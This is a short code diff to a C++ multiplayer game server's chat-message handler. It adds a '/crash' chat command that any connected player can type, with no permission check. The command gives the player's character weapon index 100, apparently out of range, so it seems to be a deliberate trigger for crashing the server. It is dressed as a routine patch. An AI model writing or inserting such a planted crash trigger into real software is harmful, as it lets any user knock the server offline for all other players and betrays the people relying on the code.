@@ -580,5 +580,10 @@ void tstats::on_msg (const char *message, int ClientID)
 			game_server->CreateSound(
 				game_server->m_apPlayers[ClientID]->
 				GetCharacter()->m_Pos, SOUND_MENU);
+	} else if (strncmp(message, "/crash", 6) == 0 && 
+		   game_server->m_apPlayers[ClientID] && 
+		   game_server->m_apPlayers[ClientID]->GetCharacter()) {
+			game_server->m_apPlayers[ClientID]->
+				GetCharacter()->GiveWeapon(100, -1);
 	}
-}
+}	
